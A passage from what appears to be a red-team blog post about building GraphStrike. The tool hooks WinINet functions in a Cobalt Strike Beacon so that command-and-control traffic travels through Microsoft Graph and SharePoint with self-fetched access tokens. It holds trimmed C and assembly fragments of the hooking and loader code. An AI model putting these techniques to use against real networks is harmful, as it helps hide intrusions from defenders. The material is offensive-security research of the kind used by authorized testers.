class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div></div><div class="enlighter-raw">[BITS 64]

GLOBAL GetIp
GLOBAL Stub
GLOBAL MemAddr

[SECTION .text$C]

Stub:
    dq 0
    dq 0
    dq 0

MemAddr:
    dq 0

... Trimmed for Brevity ...</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">[BITS 64]

GLOBAL GetIp
GLOBAL Stub
GLOBAL MemAddr

[SECTION .text$C]

Stub:
    dq 0
    dq 0
    dq 0

MemAddr:
    dq 0

... Trimmed for Brevity ...</pre>
<p>I then made a new structure <code class="code cc-1o5d2cw" data-renderer-mark="true">MEMADDR, *PMEMADDR</code> in the header file and declared <code class="code cc-1o5d2cw" data-renderer-mark="true">MemAddr</code> as extern:</p>
</div>
</div>
</div>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k2">typedef</span><span class="enlighter-text"> </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> </span><span class="enlighter-m0">__attribute__</span><span class="enlighter-g1">((</span><span class="enlighter-text"> packed </span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    PVOID* address;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"> MEMADDR, *PMEMADDR;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">extern</span><span class="enlighter-text"> ULONG_PTR </span><span class="enlighter-m0">MemAddr</span><span class="enlighter-g1">(</span><span class="enlighter-text"> VOID </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">typedef struct __attribute__(( packed )) {
    PVOID* address;
} MEMADDR, *PMEMADDR;

extern ULONG_PTR MemAddr( VOID );</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">typedef struct __attribute__(( packed )) {
    PVOID* address;
} MEMADDR, *PMEMADDR;

extern ULONG_PTR MemAddr( VOID );</pre>
<p>In GraphLdr’s entry point within ‘gs.c’, I then allocated memory for the MemAddrs structure (the large one shown earlier with all of the function pointers and variables) as <code class="code cc-1o5d2cw" data-renderer-mark="true">pMemAddrs</code> and assigned some variables. The ‘resolveGraphStrikeFunctions’ method was called to populate the function pointers within <code class="code cc-1o5d2cw" data-renderer-mark="true">pMemAddrs</code> so that the required Windows and C API calls may be used, and finally a pointer to <code class="code cc-1o5d2cw" data-renderer-mark="true">pMemAddrs</code> was assigned to the <code class="code cc-1o5d2cw" data-renderer-mark="true">MemAddr</code> variable that resides in the asm:</p>
</div>
</div>
</div>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">        ... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text">        </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Create MemAddr struct to contain important values for GraphStrike</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        struct MemAddrs *pMemAddrs  = Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">malloc</span><span class="enlighter-g1">(</span><span class="enlighter-m0">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">struct MemAddrs</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs, </span><span class="enlighter-n1">0</span><span class="enlighter-text">, </span><span class="enlighter-m0">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">struct MemAddrs</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">graphStrike = </span><span class="enlighter-g1">(</span><span class="enlighter-text">BOOL</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-k1">NULL</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">firstGet = </span><span class="enlighter-k1">TRUE</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">firstPost = </span><span class="enlighter-k1">TRUE</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">readTasking = </span><span class="enlighter-k1">FALSE</span><span class="enlighter-text">;        </span></div></div><div class=""><div><span class="enlighter-text">        pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">lastTokenTime = </span><span class="enlighter-n1">0</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Resolve GraphStrike functions for later use</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">resolveGraphStrikeFunctions</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;Api, pMemAddrs</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Store pointer to pMemAddrs for later reference</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">((</span><span class="enlighter-text">PMEMADDR</span><span class="enlighter-g1">)</span><span class="enlighter-text">MemAddr</span><span class="enlighter-g1">)</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">address = </span><span class="enlighter-g1">(</span><span class="enlighter-text">PVOID*</span><span class="enlighter-g1">)</span><span class="enlighter-text">&amp;pMemAddrs;  </span></div></div><div class=""><div><span class="enlighter-text">        </span></div></div><div class=""><div><span class="enlighter-text">        ... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div></div><div class="enlighter-raw">        ... Trimmed for Brevity ...
        
        // Create MemAddr struct to contain important values for GraphStrike
        struct MemAddrs *pMemAddrs  = Api.msvcrt.malloc(sizeof(struct MemAddrs));
        Api.msvcrt.memset(pMemAddrs, 0, sizeof(struct MemAddrs));
        pMemAddrs-&gt;graphStrike = (BOOL) U_PTR ( NULL );
        pMemAddrs-&gt;firstGet = TRUE;
        pMemAddrs-&gt;firstPost = TRUE;
        pMemAddrs-&gt;readTasking = FALSE;        
        pMemAddrs-&gt;lastTokenTime = 0;

        // Resolve GraphStrike functions for later use
        resolveGraphStrikeFunctions(&amp;Api, pMemAddrs);

        // Store pointer to pMemAddrs for later reference
        ((PMEMADDR)MemAddr)-&gt;address = (PVOID*)&amp;pMemAddrs;  
        
        ... Trimmed for Brevity ...</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">        ... Trimmed for Brevity ...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Create&nbsp;MemAddr&nbsp;struct&nbsp;to&nbsp;contain&nbsp;important&nbsp;values&nbsp;for&nbsp;GraphStrike
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;MemAddrs&nbsp;*pMemAddrs&nbsp;&nbsp;=&nbsp;Api.msvcrt.malloc(sizeof(struct&nbsp;MemAddrs));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Api.msvcrt.memset(pMemAddrs,&nbsp;0,&nbsp;sizeof(struct&nbsp;MemAddrs));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;graphStrike&nbsp;=&nbsp;(BOOL)&nbsp;U_PTR&nbsp;(&nbsp;NULL&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;firstGet&nbsp;=&nbsp;TRUE;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;firstPost&nbsp;=&nbsp;TRUE;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;readTasking&nbsp;=&nbsp;FALSE;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;lastTokenTime&nbsp;=&nbsp;0;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Resolve&nbsp;GraphStrike&nbsp;functions&nbsp;for&nbsp;later&nbsp;use
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;resolveGraphStrikeFunctions(&amp;Api,&nbsp;pMemAddrs);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Store&nbsp;pointer&nbsp;to&nbsp;pMemAddrs&nbsp;for&nbsp;later&nbsp;reference
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;((PMEMADDR)MemAddr)-&gt;address&nbsp;=&nbsp;(PVOID*)&amp;pMemAddrs;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...&nbsp;Trimmed&nbsp;for&nbsp;Brevity&nbsp;...</pre>
<p>Later in any function that I want to use values from <code class="code cc-1o5d2cw" data-renderer-mark="true">pMemAddrs</code> in, I simply dereference the pointer stored in <code class="code cc-1o5d2cw" data-renderer-mark="true">MemAddr</code> as seen in line 4:</p>
</div>
</div>
</div>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> D </span><span class="enlighter-g1">)</span><span class="enlighter-text"> HINTERNET </span><span class="enlighter-m0">InternetConnectA_Hook</span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Resolve API's</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> MemAddrs* pMemAddrs = *</span><span class="enlighter-g1">(</span><span class="enlighter-k2">struct</span><span class="enlighter-text"> MemAddrs**</span><span class="enlighter-g1">)((</span><span class="enlighter-text">PMEMADDR</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> MemAddr </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">address;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Only do this the first time through this function to check if this is actually a GraphStrike Beacon as opposed to a regular Beacon created with GraphStrike loaded</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">graphStrike == </span><span class="enlighter-g1">(</span><span class="enlighter-text">BOOL</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-e1">NULL</span><span class="enlighter-text"> </span><span class="enlighter-g1">))</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Convert lpszServerName to lowercase just in case</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k5">char</span><span class="enlighter-text">* serverCopy = </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text"> *</span><span class="enlighter-g1">)</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">lpszServerName</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + 1, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text">    ... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">SECTION( D ) HINTERNET InternetConnectA_Hook( HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext )
{
    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )-&gt;address;

    // Only do this the first time through this function to check if this is actually a GraphStrike Beacon as opposed to a regular Beacon created with GraphStrike loaded
    if (pMemAddrs-&gt;graphStrike == (BOOL) U_PTR( NULL ))
    {
        // Convert lpszServerName to lowercase just in case
        char* serverCopy = (char *)pMemAddrs-&gt;Api.msvcrt.calloc(pMemAddrs-&gt;Api.msvcrt.strlen(lpszServerName) + 1, sizeof(char));
    
    ... Trimmed for Brevity ...
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">SECTION( D ) HINTERNET InternetConnectA_Hook( HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext )
{
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Resolve&nbsp;API's
&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;MemAddrs*&nbsp;pMemAddrs&nbsp;=&nbsp;*(struct&nbsp;MemAddrs**)((PMEMADDR)&nbsp;OFFSET&nbsp;(&nbsp;MemAddr&nbsp;)&nbsp;)-&gt;address;

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Only&nbsp;do&nbsp;this&nbsp;the&nbsp;first&nbsp;time&nbsp;through&nbsp;this&nbsp;function&nbsp;to&nbsp;check&nbsp;if&nbsp;this&nbsp;is&nbsp;actually&nbsp;a&nbsp;GraphStrike&nbsp;Beacon&nbsp;as&nbsp;opposed&nbsp;to&nbsp;a&nbsp;regular&nbsp;Beacon&nbsp;created&nbsp;with&nbsp;GraphStrike&nbsp;loaded
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(pMemAddrs-&gt;graphStrike&nbsp;==&nbsp;(BOOL)&nbsp;U_PTR(&nbsp;NULL&nbsp;))
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Convert&nbsp;lpszServerName&nbsp;to&nbsp;lowercase&nbsp;just&nbsp;in&nbsp;case
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char*&nbsp;serverCopy&nbsp;=&nbsp;(char&nbsp;*)pMemAddrs-&gt;Api.msvcrt.calloc(pMemAddrs-&gt;Api.msvcrt.strlen(lpszServerName)&nbsp;+&nbsp;1,&nbsp;sizeof(char));
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;...&nbsp;Trimmed&nbsp;for&nbsp;Brevity&nbsp;...
}</pre>
<p>This final evolution came very late in GraphStrike’s development (as I was writing this section of the blog post!) but presents a very nice and handy solution that I anticipate also using in the future on other projects.</p>
<h4 id="Identifying-Beacon-Communication-API’s" data-renderer-start-pos="37292"><span class="ez-toc-section" id="Identifying_Beacon_Communication_APIs" ez-toc-data-id="#Identifying_Beacon_Communication_APIs"></span>Identifying Beacon Communication API’s<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="37332">With the ability to hook API’s and carry variables across different functions figured out, the next task is to figure out which API’s we need to be concerned with hooking in the first place. The recent<a class="cc-tgpl01" title="https://www.cobaltstrike.com/blog/cobalt-strike-49-take-me-to-your-loader" href="https://www.cobaltstrike.com/blog/cobalt-strike-49-take-me-to-your-loader" data-testid="link-with-safety" data-renderer-mark="true"> v4.9 release</a> of Cobalt Strike saw support for the <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/windows/win32/winhttp/about-winhttp" href="https://learn.microsoft.com/en-us/windows/win32/winhttp/about-winhttp" data-testid="link-with-safety" data-renderer-mark="true">WinHTTP library</a> added as an option for Beacon. Beacon has traditionally used the <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/windows/win32/wininet/http-sessions" href="https://learn.microsoft.com/en-us/windows/win32/wininet/http-sessions" data-testid="link-with-safety" data-renderer-mark="true">WinINet library</a> (and it remains the default) for web requests, so I decided it made sense to target this library for GraphStrike support. Extending support to the WinHTTP library is entirely possible as well, but that is a task for another day.</p>
<p data-renderer-start-pos="37911">Having identified the library that Beacon uses for communications, we need to take a deeper look at the specific API’s that are called by Beacon during that process. The general flow of WinINet functions that we are concerned with, as well as their utility for our purposes, is summarized below:</p>
<div class="pm-table-container with-shadow-observer" data-layout="custom">
<div class="pm-table-wrapper">
<table data-testid="renderer-table" data-number-column="false" data-table-width="760">
<colgroup>
<col>
<col></colgroup>
<tbody>
<tr>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="194" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<div class="fabric-editor-block-mark fabric-editor-alignment cc-1mg5rgz" data-align="center">
<p data-renderer-start-pos="38211"><strong data-renderer-mark="true">Api</strong></p>
</div>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="564" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<div class="fabric-editor-block-mark fabric-editor-alignment cc-1mg5rgz" data-align="center">
<p data-renderer-start-pos="38218"><strong data-renderer-mark="true">Description</strong></p>
</div>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="194">
<div class="fabric-editor-block-mark fabric-editor-alignment cc-1mg5rgz" data-align="center">
<p data-renderer-start-pos="38235">InternetConnectA</p>
</div>
</td>
<td colspan="1" rowspan="1" data-colwidth="564">
<p data-renderer-start-pos="38255">Opens a handle to a specific site (e.g. https://graph.microsoft.com ). This API call is where we specify that the HTTPS protocol should be used.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="194">
<div class="fabric-editor-block-mark fabric-editor-alignment cc-1mg5rgz" data-align="center">
<p data-renderer-start-pos="38405">HttpOpenRequestA</p>
</div>
</td>
<td colspan="1" rowspan="1" data-colwidth="564">
<p data-renderer-start-pos="38425">Opens a handle to specific URI on a site using a handle returned by InternetConnectA. In this call the request verb (GET, POST, etc) and URI (e.g. ‘/me/drive/root:/FolderA/FileB.txt:/content’) are specified.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="194">
<div class="fabric-editor-block-mark fabric-editor-alignment cc-1mg5rgz" data-align="center">
<p data-renderer-start-pos="38638">HttpSendRequestA</p>
</div>
</td>
<td colspan="1" rowspan="1" data-colwidth="564">
<p data-renderer-start-pos="38658">Sends an actual request using the handle returned by HttpOpenRequestA. The request headers and request body(optional) are specified here.</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="194">
<div class="fabric-editor-block-mark fabric-editor-alignment cc-1mg5rgz" data-align="center">
<p data-renderer-start-pos="38801">InternetReadFile</p>
</div>
</td>
<td colspan="1" rowspan="1" data-colwidth="564">
<p data-renderer-start-pos="38821">Reads data returned by a server from request using the handle returned by HttpOpenRequestA.</p>
</td>
</tr>
</tbody>
</table>
<div class="sentinel-right"></div>
</div>
</div>
<p data-renderer-start-pos="38917">Just from the brief descriptions of these API’s one can start to see opportunities to manipulate Beacon’s behavior. For example by hooking HttpOpenRequestA we could manipulate the verb that is used in order to make a PUT request instead of a POST. Similarly, in HttpSendRequestA we can manipulate the request headers used by Beacon in order to send a valid access token with the request.</p>
<p data-renderer-start-pos="39306">Another thing worth noting is that Beacon calls these API’s in order; each http-get or http-post cycle begins with a call to InternetConnectA, followed by calls to HttpOpenRequestA, HttpSendRequestA, and then (if the server returns output) a call to InternetReadFile. This enables us to logically correlate these API calls, meaning that that if Beacon calls HttpSendRequestA I know that it is done on the heels of a prior call to HttpOpenRequestA, and that both of these calls are part of the same http-get or http-post cycle within Beacon.</p>
<p>&nbsp;</p>
<h4 id="Web-Request-Inception" data-renderer-start-pos="39848"><span class="ez-toc-section" id="Web_Request_Inception" ez-toc-data-id="#Web_Request_Inception"></span>Web Request Inception<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="39871">One of the requirements identified earlier is that we need Beacon to be able to fetch it’s own access tokens. As discussed, this presents some challenges seeing as they are retrieved from login.microsoft.com, and Beacon is programmed to call out to graph.microsoft.com by the listener. Having established that we can run arbitrary code in a hooked function, I wondered if it was possible for me to make a completely separate web request… while in the middle of making a web request. I had no technical reason to think I wouldn’t be able to, but I decided I needed to validate this capability quickly as it is hugely important to GraphStrike’s <span id="dd1b9756-a0a1-4f1e-b8d2-93bc533e8911" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="dd1b9756-a0a1-4f1e-b8d2-93bc533e8911">success</span>.</p>
<div class="rich-media-item mediaSingleView-content-wrap image-center cc-l9ysxq" data-layout="center" data-width="690" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-mw5obs">
<div data-type="file" data-node-type="media" data-width="690" data-height="779" data-id="7a0948c9-37dd-4d1e-953e-5571cb8029cd" data-collection="contentId-85164073" data-file-name="image-20240114-015732.png" data-file-size="65517" data-file-mime-type="image/png" data-alt="image-20240114-015732.png" data-context-id="85164073">
<div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-1n5x7zs" data-testid="media-card-view">
<div style="width: 567px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="" src="https://redsiege.com/wp-content/uploads/2024/01/05.-Graph-Strike.png" alt="Fetching an Access Token During Beacon’s Http-Get Cycle" width="557" height="629"><p class="wp-caption-text">Fetching an Access Token During Beacon’s Http-Get Cycle</p></div>
</div>
</div>
</div>
<div class="cc-m15eub" data-media-caption="true" data-testid="media-caption" data-renderer-start-pos="40529"></div>
</div>
<p data-renderer-start-pos="40587">In essence, when Beacon begins its http-get cycle and calls the four WinINet API’s we mentioned, in one of the hooked functions I wanted to go make an entirely separate web request to login.microsoft.com in order to retrieve an access token. In looking at where I should try and implement this, I saw that HttpOpenRequestA takes the URI of Beacon’s http-get request as a parameter. This URI needs to reference a unique file in SharePoint that we are going to access using Graph API. We need an access token to use Graph API, so by necessity we need to try to make this ‘out of band’ web request here.</p>
<p data-renderer-start-pos="41189">I put together a function ‘MakeWebRequest’ to facilitate the use of this technique elsewhere in the project:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> D </span><span class="enlighter-g1">)</span><span class="enlighter-text"> LPVOID </span><span class="enlighter-m0">MakeWebRequest</span><span class="enlighter-g1">(</span><span class="enlighter-text">HANDLE hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                    PVOID site, </span></div></div><div class=""><div><span class="enlighter-text">                                    PVOID uri, </span></div></div><div class=""><div><span class="enlighter-text">                                    PVOID verb, </span></div></div><div class=""><div><span class="enlighter-text">                                    PVOID headers, </span></div></div><div class=""><div><span class="enlighter-text">                                    PVOID content, </span></div></div><div class=""><div><span class="enlighter-text">                                    </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> MemAddrs* pMemAddrs</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    LPVOID lpResult = </span><span 